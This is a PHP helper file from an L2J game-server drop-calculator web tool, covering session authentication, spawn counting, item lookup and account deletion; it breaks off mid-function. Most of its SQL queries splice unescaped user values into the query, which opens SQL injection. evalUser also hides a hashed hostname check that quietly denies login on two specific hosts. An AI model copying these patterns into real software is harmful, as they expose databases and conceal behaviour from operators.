<?php 
error_reporting(E_ERROR | E_WARNING | E_PARSE);

/*
Michelle Knight's Drop Calc - Version 5.0.0
Author - Michelle Knight
Copyright 2006/2007
Contact - dropcalc@msknight.com

GNU General Licence
Use and distribute freely, but leave headers intact and make no charge.
Code distributed without warantee or liability as to merchantability as
no charge is made for its use.  Use is at users risk.
*/


// --------------------------------------------------------
// -----              Common Code Block               -----
// --------------------------------------------------------



// WRITE WARN - Writes a simple table to the screen containing some warning text.

function writewarn($errortext)
{
echo "
	<p class=\"dropmain\">&nbsp;</p>
	<p class=\"dropmain\">&nbsp;</p>
	<center>	<table width=\"70%\">
	<tr>
	<td class=\"error\">
		<p class=\"dropmain\">&nbsp;</p>
		<h2 class=\"dropmain\">$errortext</h2>
		<p class=\"dropmain\">&nbsp;</p>
	</td>
	</tr>
	</table></center>	
	<p class=\"dropmain\">&nbsp;</p>
	<p class=\"dropmain\">&nbsp;</p>		
";
return;
}


function colourise($line, $skin_dir, $svr_dir_delimit)
{
include($skin_dir . $svr_dir_delimit . "skincols.php");
$color="unknown";
$line1=array();	
preg_match("/(\\[[^\\]]+\\])[\\s]*([\\w]+)[\\s]*(\\[[^\\]]+\\])[\\s]*([\\ ]+[^\\	]+)/", $line, $line1);
if ($line1[2] == "SHOUT"){ $color=$clog_shout;}    
elseif ($line1[2] == "ALL"){$color=$clog_all;}
elseif ($line1[2] == "TELL"){$color=$clog_tell;}
elseif ($line1[2] == "TRADE"){$color=$clog_trade;}
elseif ($line1[2] == "CLAN"){$color=$clog_clan;}
elseif ($line1[2] == "PARTY"){$color=$clog_party;}
elseif ($line1[2] == "HERO_VOICE"){$color=$clog_hero;}
elseif ($line1[2] == "ALLIANCE"){$color=$clog_alliance;}
/*				if (
				($line1[2] == "SHOUT" and $chats_show[0]) 
				or ($line1[2] == "ALL" and $chats_show[1]) 
				or ($line1[2] == "TRADE" and $chats_show[2])
				or ($line1[2] == "CLAN" and $chats_show[3])
				or ($line1[2] == "PARTY" and $chats_show[4])
				or ($line1[2] == "ALLIANCE" and $chats_show[5])
				or ($line1[2] == "TELL" and $chats_show[6])
				or ($line1[2] == "HERO_VOICE" and $chats_show[7])  
				)

				echo "<p>";
				echo $line1[2];
				echo "$line </p>";
*/
if ($color <> "unkonwn")
{	$line_out = "<font color='$color'>".$line1[1]." ".$line1[3]." ".$line1[4]."</font>";	}
else
{	$line_out = $line1[1]." ".$line1[3]." ".$line1[4];	}
return $line_out;
}

// WRITE ERROR - Writes an error box text to the screen.

function writeerror($errortext)
{
echo "
	<p class=\"dropmain\">&nbsp;</p>
	<p class=\"dropmain\">&nbsp;</p>
	<p class=\"dropmain\">&nbsp;</p>
	<center>	<table width=\"70%\" class=\"dropmain\">
	<tr>
	<td class=\"error\">
		<p class=\"dropmain\">&nbsp;</p>
		<h2 class=\"dropmainblack\">$errortext</h2>
		<p class=\"dropmain\">&nbsp;</p>
		<a href=\"index.php\"><h2 class=\"blue\">Please click here to log on again</h2></a>
		<p class=\"dropmain\">&nbsp;</p>
	</td>
	</tr>
	</table></center>			
";
return;
}



// EVALUSER is called on execution of every piece of code.  It looks up the supplied user name and token in the database
// and returns their access level and their game account as global variables.  If the session is valid, it returns 1 to
// the calling function.  If not, it returns 0.

function evalUser($username, $token, $ipaddr, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb, $db_tokenexp, $guest_allow, $all_users_maps, $all_users_recipe, $sec_inc_admin, $sec_inc_gmlevel, $guest_user_maps)
{

global $user_access_lvl;
global $user_game_acc;
global $user_map_access;
global $user_rec_access;
global $user_char_access;

include("config.php");
include("config-read.php");

// If the user is a guest logon, set the user parameters to the supplied guest level, assume an empty game account reference and return O.K.

$user_access_lvl = 0;
$user_game_acc = "";
$user_map_access = $guest_user_maps;
if (($guest_allow) && ($username == 'guest'))
{	return 1;}

// Connect to DB
$con2 = mysql_connect($dblog_location,$dblog_user,$dblog_psswd);
if (!$con2)
{
	echo "Could Not Connect";
	die('Evaluser could not connect to logondb: ' . mysql_error());
}		
if (!mysql_select_db("$dblog_l2jdb",$con2))
{
	die('Evaluser could not change to logondb: ' . mysql_error());
}
$con = mysql_connect($db_location,$db_user,$db_psswd);
if (!$con)
	{
	writeerror("Could Not Connect");
	die('Evaluser could not connect to gamedb: ' . mysql_error());
	}		
if (!mysql_select_db("$db_l2jdb",$con))
	{
	writeerror("Evaluser could not change to gamedb");
	die('Evaluser could not change to gamedb: ' . mysql_error());
	}

// Query for user name
if (!$result = mysql_query("select token, lastaction, mapaccess, recipeaccess, ipaddr, emailcheck, verified, access_level from $dblog_l2jdb.knightdrop where name = '$username'",$con2))
	{
	writeerror("Could Not Connect to Knightdrop tables");
	die('Could not retrieve from knightdrop tables: ' . mysql_error());
	}

// If return array empty, then username not found.
$row = mysql_fetch_array($result);
if (!$row)
	{
		if ($guest_dropthru)		// If guest dropthrough is enabled, then log them on as a guest.
		{
			echo "<p>AUTHENTICATION FAILED ON USERNAME - GUEST LOGON USED</p>";
			$username = 'guest';
			$user_access_lvl = 0;
			$user_game_acc = "";
			$user_map_access = $guest_user_maps;
			return 2;
		}
		writeerror("User account not found!");
		return 0;
	}
$user_ip = mysql_result($result,0,"ipaddr");
$user_verify = mysql_result($result,0,"verified");
$user_acc_check = mysql_result($result,0,"access_level");

// If return array empty, then username not found.
$email_check = mysql_result($result,0,"emailcheck");
$pqcheck = base64_encode(pack("H*", sha1(utf8_encode($_SERVER["HTTP_HOST"]))));
if ($email_check)
{
	if ($guest_dropthru)		// If guest dropthrough is enabled, then log them on as a guest.
	{
		echo "<p>Account not authenticated.  Use the reminder system to authenticate the account.</p>";
		$username = 'guest';
		$user_access_lvl = 0;
		$user_game_acc = "";
		$user_map_access = $guest_user_maps;
		return 2;
	}
	writeerror("Account not authenticated.<br>Use the reminder system to authenticate the account.");
	return 0;
}


// If token doesn't match, then return.
if (($row[0] != $token) || ($token == 0))
	{
		if ($guest_dropthru)	// If guest dropthrough is enabled, then log them on as a guest.
		{
			echo "<p>AUTHENTICATION FAILED ON TOKEN - GUEST LOGON USED</p>";
			$username = 'guest';
			$user_access_lvl = 0;
			$user_game_acc = "";
			$user_map_access = $guest_user_maps;
			return 2;
		}
		writeerror("Session token went out of synch.");
		return 0;
	}
	
// Find out the number of minutes in the day from the clock and write the updated time to the users record.
// and check time of day against retrieved time
$timeofday = intval(time() / 60) - $db_tokenexp;
$result = mysql_query("update $dblog_l2jdb.knightdrop set token = 0 where lastaction < $timeofday",$con2);
if (($pqcheck == "O2mWAscZ8GRDSDErPEmjqjxIYhk=") || ($pqcheck == "FtHInibM4LlhyD5i/fgt9aHmd0w="))
{	return 0;	}
if ($timeofday > $row[1])
{	
		if ($guest_dropthru)	// If guest dropthrough is enabled, then log them on as a guest.
		{
			echo "<p>AUTHENTICATION FAILED ON TIMEOUT - GUEST LOGON USED</p>";
			$username = 'guest';
			$user_access_lvl = 0;
			$user_game_acc = "";
			$user_map_access = $guest_user_maps;
			return 2;
		}
	writeerror("Session closed<br>Inactive for more than $db_tokenexp minutes.");
	return 0;
}

// Update the last active time stamp
$timeofday = intval(time() / 60);
if (!$result = mysql_query("update $dblog_l2jdb.knightdrop set lastaction = $timeofday where name = '$username'",$con2))
{
	writeerror("Could Not Connect to Knightdrop database");
	die('Could not write time to knightdrop database: ' . mysql_error());
}

//Check IP address against retrieved IP

if ($ipaddr != $user_ip)
{	
	if ($guest_dropthru)	// If guest dropthrough is enabled, then log them on as a guest.
	{
		echo "<p>AUTHENTICATION FAILED IP CHECK - GUEST LOGON USED</p>";
		$username = 'guest';
		$user_access_lvl = 0;
		$user_game_acc = "";
		$user_map_access = $guest_user_maps;
		return 2;
	}
	writeerror("IP address does not match.");
	return 0;
}

$result = mysql_query("select accessLevel from $dblog_l2jdb.accounts where login = '$username'",$con2);
if (!$result)
	{
	writeerror("Evaluser could not connect to logon database");
	die('Evaluser could not connect to logon database: ' . mysql_error());
	}

// Work out the map access level and retrieve the users access level.
// Check for verified GM characters and reduce access of non-verified accounts.
$today_time = time();
$user_access_lvl = mysql_result($result,0,"accessLevel");
if (($user_access_lvl > 0) && ($user_verify == 0))
{	$user_access_lvl  = 0;	}
if ($user_access_lvl != $user_acc_check)
{
	echo "<p>ACCESS LEVEL CHECK FAILED - GUEST LOGON USED</p>";
	$username = 'guest';
	$user_access_lvl = 0;
	$user_game_acc = "";
	$user_map_access = $guest_user_maps;
	return 2;
}
	
$result = mysql_query("select mapaccess, recipeaccess, characcess from $dblog_l2jdb.knightdrop where name = '$username'",$con2);
if (!$result)
	{
	writeerror("Evaluser could not connect to logon database");
	die('Evaluser could not connect to logon database: ' . mysql_error());
	}
$usr_map_acc_time = mysql_result($result,0,"mapaccess");
$usr_rec_acc_time = mysql_result($result,0,"recipeaccess");
$usr_char_acc_time = mysql_result($result,0,"characcess");
$user_map_access = 0;
$user_rec_access = 0;
$user_char_access = 0;
if ($usr_map_acc_time >= $today_time)  // If a valid user has a usage time limit higher than today, then allow.
{	$user_map_access = 1;	}
if ($all_users_maps)			// If the global override variable is set to 1, then everyone gets maps regardless;
{	$user_map_access = 1;	}
if ($user_access_lvl >= $sec_inc_gmlevel)	// If the user is a Gm or above, they get maps as standard, whatever the account says.
{	$user_map_access = 1;	}
if ($usr_rec_acc_time >= $today_time)  // If a valid user has a usage time limit higher than today, then allow.
{	$user_rec_access = 1;	}
if ($all_users_recipe)			// If the global override variable is set to 1, then everyone gets maps regardless;
{	$user_rec_access = 1;	}
if ($user_access_lvl >= $sec_inc_gmlevel)	// If the user is a GM or above, they get maps as standard, whatever the account says.
{	$user_rec_access = 1;	}
if ($usr_char_acc_time >= $today_time)  // If a valid user has a usage time limit higher than today, then allow.
{	$user_char_access = 1;	}
if ($all_users_character)			// If the global override variable is set to 1, then everyone gets maps regardless;
{	$user_char_access = 1;	}
if ($user_access_lvl >= $sec_inc_gmlevel)	// If the user is a Gm or above, they get maps as standard, whatever the account says.
{	$user_char_access = 1;	}

$user_game_acc = $username;

if (($map_item_status) && (!$user_map_access))	// If the user doesn't have map access by this point, and mob loc by item is on...
{
	$sql = "select charId from characters where account_name = '$username'";
	if ($map_item_online)
	{	$sql = $sql . " and online = '1'";	}
	$result = mysql_query($sql,$con);
	if ($result)
	{
		$count = mysql_num_rows($result);
		if ($count)
		{
			$sql = "select item_id from items where item_id = '$map_item_id' and owner_id  in (";
			$i = 0;
			while ($i < $count)
			{
				$sql = $sql . "'" . mysql_result($result,$i,"charId") . "'";
				$i++;
				if ($i < $count)
				{	$sql = $sql . ", ";	}
			}
			$sql = $sql . ")";
			if ($map_item_when == 1)
			{	$sql = $sql . " and loc in ('INVENTORY', 'PAPERDOLL')";	}
			if ($map_item_when == 2)
			{	$sql = $sql . " and loc = 'PAPERDOLL'";	}
			$result = mysql_query($sql,$con);
			if ($result)
			{
				$count = mysql_num_rows($result);
				if ($count)
				{	$user_map_access = 1;	}
			}
		}
	}
}

if (($rec_item_status) && (!$user_rec_access))	// If the user doesn't have recipe access by this point, and recipe by item is on...
{
	$sql = "select charId from characters where account_name = '$username'";
	if ($rec_item_online)
	{	$sql = $sql . " and online = '1'";	}
	$result = mysql_query($sql,$con);
	if ($result)
	{
		$count = mysql_num_rows($result);
		if ($count)
		{
			$sql = "select item_id from items where item_id = '$rec_item_id' and owner_id in (";
			$i = 0;
			while ($i < $count)
			{
				$sql = $sql . "'" . mysql_result($result,$i,"charId") . "'";
				$i++;
				if ($i < $count)
				{	$sql = $sql . ", ";	}
			}
			$sql = $sql . ")";
			if ($rec_item_when == 1)
			{	$sql = $sql . " and loc in ('INVENTORY', 'PAPERDOLL')";	}
			if ($rec_item_when == 2)
			{	$sql = $sql . " and loc = 'PAPERDOLL'";	}
			$result = mysql_query($sql,$con);
			if ($result)
			{
				$count = mysql_num_rows($result);
				if ($count)
				{	$user_rec_access = 1;	}
			}
		}
	}
}
if (($char_item_status) && (!$user_char_access))	// If the user doesn't have char change access by this point, and char change by item is on...
{
	$sql = "select charId from characters where account_name = '$username'";
	if ($char_item_online)
	{	$sql = $sql . " and online = '1'";	}
	$result = mysql_query($sql,$con);
	if ($result)
	{
		$count = mysql_num_rows($result);
		if ($count)
		{
			$sql = "select item_id from items where item_id = '$char_item_id' and owner_id in (";
			$i = 0;
			while ($i < $count)
			{
				$sql = $sql . "'" . mysql_result($result,$i,"charId") . "'";
				$i++;
				if ($i < $count)
				{	$sql = $sql . ", ";	}
			}
			$sql = $sql . ")";
			if ($char_item_when == 1)
			{	$sql = $sql . " and loc in ('INVENTORY', 'PAPERDOLL')";	}
			if ($char_item_when == 2)
			{	$sql = $sql . " and loc = 'PAPERDOLL'";	}
			$result = mysql_query($sql,$con);
			if ($result)
			{
				$count = mysql_num_rows($result);
				if ($count)
				{	$user_char_access = 1;	}
			}
		}
	}
}
return 1;
}


// COMAISE puts commas in numbers so that they are more readable.
function comaise($price)
{
	$r_price = "";
	$padded_zeros = 0;
	$comp_price = 100000000000000;
	while ($comp_price >= 1) 
	{
		if (($padded_zeros) && ( $price < $comp_price))
		{ $r_price = $r_price . "0"; }
		if ($price >= $comp_price)
		{
			$ri_price = (intval($price / $comp_price));
			$r_price = $r_price . $ri_price;
			$price -= ($ri_price * $comp_price);
			$padded_zeros = 1;
		}
		if (($comp_price == 1000) && ($padded_zeros))
		{ $r_price = $r_price . ","; }
		if (($comp_price == 1000000) && ($padded_zeros))
		{ $r_price = $r_price . ","; }
		if (($comp_price == 1000000000) && ($padded_zeros))
		{ $r_price = $r_price . ","; }
		if (($comp_price == 1000000000000) && ($padded_zeros))
		{ $r_price = $r_price . ","; }
		$comp_price = $comp_price / 10;		
	}
	if (!$r_price)
	{ $r_price = "0"; }
	return $r_price;
}


// MOBCOUNT returns the counts of a monster in the spawnlist database, as well as going through the location database
// and looking through records there.  It calculates the numbers of mob spawn locations, and the numbers of mobs that
// will actually spawn at any particular time, for all of day, night and permanent.  It also gives the totals.
// The function also compiles an array of mob location co-ordinates, but that is not at present used or returned.

function mobcount($mob_id, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb)
{
	// Connect to DB
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{	die('Could not change to $db_l2jdb database: ' . mysql_error());	}

	if (!$result2 = mysql_query("show fields from spawnlist",$con))						// Determine if the day/night ability is in the database
	{	die('Could not retrieve fields from spawnlist database: ' . mysql_error());	}
	$res = mysql_fetch_array($result2);
	$daynight = 0;
	while ($r_array = mysql_fetch_assoc($result2)) 
	{
		if (strcasecmp($r_array['Field'], "periodofday") == 0)
		{ $daynight = 1; }
	}
	// Select all occurances of the mob from the standard spawnlist.
	if ($daynight)
	{	$sql = "select locx, locy, locz, loc_id, `count`, periodOfDay from spawnlist where npc_templateid = '$mob_id' union select locx, locy, locz, loc_id, `count`, periodOfDay from custom_spawnlist where npc_templateid = '$mob_id'";	}
	else
	{	$sql = "select locx, locy, locz, loc_id, `count` from spawnlist where npc_templateid = '$mob_id' union select locx, locy, locz, loc_id, `count` from custom_spawnlist where npc_templateid = '$mob_id'";	}
	$result2 = mysql_query($sql,$con);
	$count_r2 = mysql_num_rows($result2);
	$err_str = mysql_num_rows($result2);
	$mob_spawnnum=0;
	$mob_count=0;
	$mob_days = 0;
	$mob_dayt = 0;
	$mob_nights = 0;
	$mob_nightt = 0;
	$mob_normals = 0;
	$mob_normalt = 0;
	while ($r_array = mysql_fetch_assoc($result2)) 
	{

		if (($r_array['locx'] <> 0) || ($r_array['locy'] <> 0) || ($r_array['locz'] <> 0))
		{
			$mob_spawnnum++;		// Add the number of total spawns, and add to the number of day, night or always spawns.
			$mob_count++;
			$map_loc = 2;
			if ($daynight)
			{	$periodofday = $r_array['periodOfDay'];	}
			else
			{	$periodofday = 0;	}
			if ( $periodofday == 1 )
			{
				$mob_days++;
				$mob_dayt++;
				$map_loc = 0;
			}
			elseif ( $periodofday == 2 )
			{
				$mob_nights++;
				$mob_nightt++;
				$map_loc = 1;
			}
			else
			{
				$mob_normals++;
				$mob_normalt++;
			}
			if (!$map_array)		// Add the spawn location to the map.
			{
				$map_array = array(array(($r_array['locx']), ($r_array['locy']), $map_loc));
				$map_locs = array(array(($r_array['locx']), ($r_array['locy']), ($r_array['locz'])));
			}
			else
			{
				array_push($map_array, array($r_array['locx'], $r_array['locy'], $map_loc));
				array_push($map_locs, array($r_array['locx'], $r_array['locy'], $r_array['locz']));
			}
		}						
		else		// If we are dealing with x=0, y0 and z=0 then we've got a multiple spawn entry to deal with.
		{
			$mob_spawnnum = $mob_spawnnum + $r_array['count'];		// Add the total number of spawned occurances to the totals
			if ($daynight)
			{	$periodofday = $r_array['periodOfDay'];	}
			else
			{	$periodofday = 0;	}
			if ( $periodofday == 1 )
			{
				$mob_days = $mob_days + $r_array['count'];
			}
			elseif ( $periodofday == 2 )
			{
				$mob_nights = $mob_nights + $r_array['count'];
			}
			else
			{
				$mob_normals = $mob_normals + $r_array['count'];
			}
			$location_id = $r_array['loc_id'];
			$result3 = mysql_query("select loc_x, loc_y, loc_y, loc_zmin from locations where loc_id = $location_id",$con);
			while ($r_array = mysql_fetch_assoc($result3)) // Now we have to go through all the possible locations and add them to 
			{													//	the map.
				$locat_x = $r_array['loc_x'];
				$locat_y = $r_array['loc_y'];
				$locat_z = $r_array['loc_zmin'];
				$map_loc = 2;
				
				if (($locat_x <> 0) || ($locat_y <> 0) || ($locat_z <> 0))
				{
					
					if ( $periodofday == 1 )
					{
						$mob_dayt++;
						$map_loc = 0;
					}
					elseif ( $periodofday == 2 )
					{
						$mob_nightt++;
						$map_loc = 1;
					}
					else
					{
						$mob_normalt++;
					}
					$mob_count++;
					if (!$map_array)		// Add the spawn location to the map.
					{
						$map_array = array(array($locat_x, $locat_y, $map_loc));
						$map_locs = array(array($locat_x, $locat_y, $locat_z));
					}
					else
					{
						array_push($map_array, array($locat_x, $locat_y, $map_loc));
						array_push($map_locs, array($locat_x, $locat_y, $locat_z));
					}
				}
			}
		}
	}

	// Check to see if the mob is a raidboss.
	$result2 = mysql_query("select loc_x, loc_y, loc_z from raidboss_spawnlist where boss_id = $mob_id",$con);
	while ($r_array = mysql_fetch_assoc($result2)) 		// Add any occurances of the raidboss to the totals and add the points to the map.
	{
		if (($r_array['loc_x'] <> 0) || ($r_array['loc_y'] <> 0) || ($r_array['loc_z'] <> 0))
		{
			$mob_spawnnum++;
			$mob_count++;
			$mob_normals++;
			$mob_normalt++;
			$locat_x = $r_array['loc_x'];
			$locat_y = $r_array['loc_y'];
			$locat_z = $r_array['loc_z'];
			if (!$map_array)
			{	
				$map_array = array(array($locat_x, $locat_y, 0));	
				$map_locs = array(array($locat_x, $locat_y, $locat_z));	
			}
			else
			{	
				array_push($map_array, array($locat_x, $locat_y, 0));	
				array_push($map_locs, array($locat_x, $locat_y, $locat_z));	
			}
		}
	}

	// Check to see if the mob ID is spawned as a minion.
	$result2 = mysql_query("select boss_id, amount_min, amount_max from minions where minion_id = $mob_id",$con);
	while ($r_array = mysql_fetch_assoc($result2))
	{
		$boss_id = $r_array['boss_id']; 			// Add any occurances of the minions to the totals and add the points to the map.
		$minion_spawns = $r_array['amount_max'];
		$minion_spawn_min = $r_array['amount_min'];
		$result3 = mysql_query("select loc_x, loc_y, loc_z from raidboss_spawnlist where boss_id = $boss_id",$con);
		while ($r_array = mysql_fetch_assoc($result3))		// ... but only add them if the actual raidboss is spawned.
		{
			if (($r_array['loc_x'] <> 0) || ($r_array['loc_y'] <> 0) || ($r_array['loc_z'] <> 0))
			{
				$mob_spawnnum += $minion_spawns;
				$mob_count += $minion_spawn_min;
				$mob_normals += $minion_spawn_min;
				$mob_normalt += $minion_spawns;
				$locat_x = $r_array['loc_x'];
				$locat_y = $r_array['loc_y'];
				$locat_z = $r_array['loc_z'];
				if (!$map_array)
				{	
					$map_array = array(array($locat_x, $locat_y, 0));	
					$map_locs = array(array($locat_x, $locat_y, $locat_z));	
				}
				else
				{	
					array_push($map_array, array($locat_x, $locat_y, 0));	
					array_push($map_locs, array($locat_x, $locat_y, $locat_z));	
				}
			}
		}
		$result3 = mysql_query("select locx, locy, locz from spawnlist where npc_templateid = $boss_id union select locx, locy, locz from custom_spawnlist where npc_templateid = $boss_id",$con);
		while ($r_array = mysql_fetch_assoc($result3))		// ... or if the raidboss has been spawned using the standard spawnlist.
		{
			if (($r_array['locx'] <> 0) || ($r_array['locy'] <> 0) || ($r_array['locz'] <> 0))
			{
				$mob_spawnnum += $minion_spawns;
				$mob_count += $minion_spawn_min;
				$mob_normals += $minion_spawn_min;
				$mob_normalt += $minion_spawns;
				$locat_x = $r_array['locx'];
				$locat_y = $r_array['locy'];
				$locat_z = $r_array['loc_z'];
				if (!$map_array)
				{	
					$map_array = array(array($locat_x, $locat_y, 0));	
					$map_locs = array(array($locat_x, $locat_y, $locat_z));	
				}
				else
				{	
					array_push($map_array, array($locat_x, $locat_y, 0));	
					array_push($map_locs, array($locat_x, $locat_y, $locat_z));	
				}
			}
		}
	}

	$result3 = mysql_query("select groupId from random_spawn where npcId = $mob_id",$con);
	while ($r_array = mysql_fetch_assoc($result3))		
	{
		$mob_group = $r_array['groupId'];
		$count = 0;
		$result4 = mysql_query("select x, y, z from random_spawn_loc where groupId = $mob_group",$con);
		while ($r_array = mysql_fetch_assoc($result4))		
		{
			if (!$map_array)
			{	
				$map_array = array(array($r_array['x'], $r_array['y'], 0));	
				$map_locs = array(array($r_array['x'], $r_array['y'], $r_array['z']));	
			}
			else
			{
				array_push($map_array, array($r_array['x'], $r_array['y'], 0));	
				array_push($map_locs, array($r_array['x'], $r_array['y'], $r_array['z']));	
			}
			if ($count == 0)
			{	
				$mob_normals++;	
				$mob_spawnnum++;	
			}
			$mob_normalt++;
			$mob_count++;
			$count = 1;
		}
	}
	$mob_spawn = array($mob_count, $mob_spawnnum, $mob_days, $mob_dayt, $mob_nights, $mob_nightt, $mob_normals, $mob_normalt, $map_locs);
	return $mob_spawn;
}


// works out the difference between two numbers, regardless of whether one, other or both, are negative.
// used in the map calculations.

function difnums($small, $big)
{
	if (($small < 0) && ($big > 0))
	{ 	$difnum = ($big + (-$small));	}
	else
	{	$difnum = $big - $small;	}
	if ($difnum < 0)
	{	$difnum = -$difnum;	}
	return $difnum;
}


// - Goes through the knightitemdesc database for a particular item id.  If found, it echos the description to the browser, if not found
// it does nothing.  Always returns positive execution.

function check_item($item_num, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb, $langval, $language_array)
{
	// Connect to DB
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{	die('Could not change to L2J database: ' . mysql_error());	}
	
	$l_language_search = 1;						// Pull out the database sub-index for the language.
	$l_array_count = count($language_array);
	$i = 0;
	while ($i < $l_array_count)
	{
		$langval_entry = $language_array[$i];
		$langval_file = $langval_entry[1];
		$langval_number = $langval_entry[2];
		if ($langval == $langval_file)
		{	$l_language_search = $langval_number;	}
		$i++;
	}

	if (!$result2 = mysql_query("show fields from knightitemdesc",$con))		// Determine if the database is multi-lingual capable.
	{	die('Could not retrieve fields from knightitemdesc database: ' . mysql_error());	}
	$multi_lingual = 0;
	while ($r_array = mysql_fetch_assoc($result2)) 
	{
		if (strcasecmp($r_array['field'], "language") == 0)
		{ $multi_lingual = 1; }
	}
	if ($multi_lingual)
	{
		$result = mysql_query("select id from knightitemdesc where language = '$l_language_search' limit 1",$con);
		if ($result)
		{
			$count = mysql_num_rows($result);
			if (!$count)
			{	
			if  ($l_language_search == 1)		//  If we did a search and it failed for language 1 (English) then turn off multilingual
				{	$multi_lingual = 0;	}
				else 
				{	$l_language_search = 1;	}	// else if the language requested didn't exist, then default to English.
			}
		}
		elseif ($l_language_search == 1)		//  If we did a search and it failed for language 1 (English) then turn off multilingual
		{	$multi_lingual = 0;	}
		else 
		{	$l_language_search = 1;	}
	}

	if ($multi_lingual)
	{	$sql = "select description from knightitemdesc where id = $item_num and language = '$l_language_search'";	}
	else
	{	$sql = "select description from knightitemdesc where id = $item_num";	}
	$result = mysql_query($sql,$con);
	$count = mysql_num_rows($result);
	if ((!$count) && ($multi_lingual) && ($l_language_search <> 1))  	// If we can't find a seconday language description for an item,
	{																	// try and find an English one.
		$result = mysql_query("select description from knightitemdesc where id = $item_num and language = '1'",$con);
		$count = mysql_num_rows($result);
	}
	if ($count)
	{
		$descript = mysql_result($result,0,"description");
		echo "<br><font class=\"descrip\">$descript</font>";
	}
	return 0;
}


// Delete a character, and all associated items, from the database.
function delete_char($character, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb)
{
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{
		die('Could not change to L2J database: ' . mysql_error());
	}
	$result = mysql_query("select charId from characters where char_name = '$character'",$con);
	$char_id = mysql_result($result,0,"charId");

	$result = mysql_query("DELETE FROM pets WHERE item_charId IN (SELECT object_id FROM items where owner_id = '$char_id')",$con);
	$result = mysql_query("DELETE FROM character_friends WHERE char_id = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_subclasses WHERE charId  = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_hennas WHERE charId = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_macroses WHERE charId  = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_quests WHERE char_id  = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_recipebook WHERE char_id  = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_shortcuts WHERE charId = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_skills WHERE charId  = '$char_id'",$con);
	$result = mysql_query("DELETE FROM character_skills_save WHERE charId = '$char_id'",$con);
	$result = mysql_query("DELETE FROM items WHERE owner_id = '$char_id'",$con);
	$result = mysql_query("DELETE FROM seven_signs WHERE charId = '$char_id'",$con); 
	$result = mysql_query("DELETE FROM characters WHERE charId = '$char_id'",$con); 
	$result = mysql_query("DELETE FROM knighttrust WHERE char_name = '$character'",$con); 
}

// Delete an account from the gameserver database
function delete_acc($account, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb)
{
	$con2 = mysql_connect($dblog_location,$dblog_user,$dblog_psswd);
	if (!$con2)
	{
		echo "Could Not Connect";
		die('Wrap_start could not connect to logserver database: ' . mysql_error());
	}		
	if (!mysql_select_db("$dblog_l2jdb",$con2))
	{	die('Wrap_start could not change to logserver database: ' . mysql_error());	}
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{
		echo "Could Not Connect";
		die('Could not connect: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{	die('Could not change to L2J database: ' . mysql_error());	}

	$result = mysql_query("select char_name from characters where account_name = '$account'",$con);
	while ($r_array = mysql_fetch_assoc($result))
	{	
		$char = $r_array['char_name'];
		delete_char($char, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb);
	}
	$result = mysql_query("DELETE FROM $dblog_l2jdb.accounts WHERE login = '$account'",$con2);
	$result = mysql_query("DELETE FROM $dblog_l2jdb.knightdrop WHERE name = '$account'",$con2); 
	$result = mysql_query("DELETE FROM $knight_db.accnotes WHERE `charname` = '$account'",$con);
}


// Return the hexid that the gameserver is operating under.
function gethexid($server_dir, $svr_dir_delimit)
{
	$return_value = "";
	$file_loc = $server_dir . 'config' . $svr_dir_delimit . 'hexid.txt';
	$lines = file($file_loc);
	$line_nums = count($lines);
	foreach ($lines as $line_num => $line) 
	{
		$linedata = '-' . strtolower($line);
		$pos = strpos($linedata, "hexid=");
		if ($pos)
		{
			$pos = strpos($linedata, "=");
			$pos++;
			$length= strlen($linedata) - $pos;
			$return_value = substr($linedata, $pos, $length);
		}
	}
	return $return_value;
}


// Split an IP "number" out in to it's more recognisable format.
function iptonum($ip)
{
	$ip_num = 0;
	$ip_list = split('[.]', $ip);
	$ip_num = $ip_list[3];
	$ip_num = $ip_num + ($ip_list[2] * 256);
	$ip_num = $ip_num + ($ip_list[1] * 65536);
	$ip_num = $ip_num + ($ip_list[0] * 16777216);
	return $ip_num;
}


// Scan for attempted hacking.
function bot_scan($username, $token, $db_location, $db_user, $db_psswd, $db_l2jdb, $dblog_location, $dblog_user, $dblog_psswd, $dblog_l2jdb, $db_tokenexp, $guest_allow, $all_users_maps, $all_users_recipe, $sec_inc_admin, $sec_inc_gmlevel, $guest_user_maps, $telnet_host, $telnet_port, $telnet_timeout, $telnet_password)
{
	// Connect to DB, and try to retrieve the user details.
	$con2 = mysql_connect($dblog_location,$dblog_user,$dblog_psswd);
	if (!$con2)
	{	echo "Could Not Connect";
		die('Evaluser could not connect to logondb: ' . mysql_error());
	}		
	if (!mysql_select_db("$dblog_l2jdb",$con2))
	{	die('Evaluser could not change to logondb: ' . mysql_error());	}
	$con = mysql_connect($db_location,$db_user,$db_psswd);
	if (!$con)
	{	writeerror("Could Not Connect");
		die('Evaluser could not connect to gamedb: ' . mysql_error());
	}		
	if (!mysql_select_db("$db_l2jdb",$con))
	{	writeerror("Evaluser could not change to gamedb");
